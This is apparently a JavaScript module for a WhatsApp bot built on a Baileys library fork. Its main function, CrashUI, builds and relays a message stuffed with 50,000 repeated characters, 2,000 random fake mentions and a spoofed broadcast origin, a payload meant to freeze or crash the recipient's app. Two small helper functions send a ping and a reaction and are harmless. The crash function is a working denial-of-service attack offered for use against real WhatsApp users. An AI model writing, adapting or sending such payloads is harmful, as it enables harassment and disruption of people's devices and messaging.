import { generateWAMessageFromContent, proto } from '@rexxhayanasi/elaina-baileys';
import chalk from 'chalk';

export async function CrashUI(sock, jid, ptcp = false) {
 const msg = generateWAMessageFromContent(jid, {
    extendedTextMessage: {
      text: '🩸⃟⃨〫⃰‣ ⁖𝐓𝐳𝐗 ‌𖣂︎‌ 𝐓›𝐞𝐚‌𝐦⃜' + "ꦾ".repeat(50000),
      contextInfo: {
        mentionedJid: Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
        ),
        remoteJid: "status@broadcast",
        participant: "0@s.whatsapp.net",
        fromMe: true,
        isForwarded: true,
        forwardingScore: 9999
      }
    }
  }, {})
  
  await sock.relayMessage(jid, msg.message, ptcp ? 
    { messageId: msg.key.id } :
    { participant: { jid: jid }, messageId: msg.key.id })
  
  console.log(chalk.green("─────「 ⏤ CrashUI Ex3cute 」─────"))
}

export async function TestPing(sock, jid) {
    const start = Date.now();
    await sock.sendMessage(jid, { text: 'Testing Ping...' });
    const latency = Date.now() - start;
    await sock.sendMessage(jid, { text: `✅ Pong! Latency: ${latency}ms` });
    console.log(chalk.blue(`[TEST] Ping sent to ${jid} (${latency}ms)`));
}

export async function TestReaction(sock, jid, key) {
    await sock.sendMessage(jid, {
        react: {
            text: "⚡",
            key: key
        }
    });
    console.log(chalk.yellow(`[TEST] Reaction sent to ${jid}`));
}